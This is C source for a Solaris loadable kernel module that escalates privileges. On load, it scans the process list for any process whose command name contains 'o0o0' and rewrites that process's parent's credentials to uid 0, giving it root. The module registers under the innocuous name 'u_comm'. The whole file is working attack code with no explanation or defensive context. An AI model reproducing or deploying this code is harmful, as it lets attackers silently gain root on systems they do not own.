#include <sys/systm.h>
#include <sys/ddi.h>
#include <sys/sunddi.h>
#include <sys/cred.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/procfs.h>
#include <sys/kmem.h>
#include <sys/errno.h>
#include <fcntl.h>
#include <unistd.h>

#include <sys/modctl.h>
extern struct mod_ops mod_miscops;

int g3mm3(void);

int g3mm3()
{

  register proc_t *p;
  register proc_t *pp;
  cred_t *cr, *newcr;

    mutex_enter(&pidlock);
      for (p = practive; p != NULL; p = p->p_next) {

             if(strstr(p->p_user.u_comm, (char *) "o0o0")) {

                pp = p->p_parent;
                newcr = crget();

                mutex_enter(&pp->p_crlock);
                cr = pp->p_cred;
                crcopy_to(cr, newcr);
                pp->p_cred = newcr;
                newcr->cr_uid = 0;
                mutex_exit(&pp->p_crlock);

              }

          continue;

        }

    mutex_exit(&pidlock);

    return 1;
}

static struct modlmisc modlmisc =
{
    &mod_miscops,
    "u_comm"
};

static struct modlinkage modlinkage =
{
    MODREV_1,
    (void *) &modlmisc,
    NULL
};

int _init(void)
{
    int i;

    if ((i = mod_install(&modlinkage)) != 0)
        //cmn_err(CE_NOTE, "");
                ;
#ifdef _DEBUG
    else
        cmn_err(CE_NOTE, "0o0o0o0o installed o0o0o0o0o0o0");
#endif

    i = g3mm3();
    return i;
}

int _info(struct modinfo *modinfop)
{
    return (mod_info(&modlinkage, modinfop));
}


int _fini(void)
{
    int i;

    if ((i = mod_remove(&modlinkage)) != 0)
        //cmn_err(CE_NOTE, "not removed");
                ;
#ifdef DEBUG
    else
        cmn_err(CE_NOTE, "removed");
#endif

    return i;
}
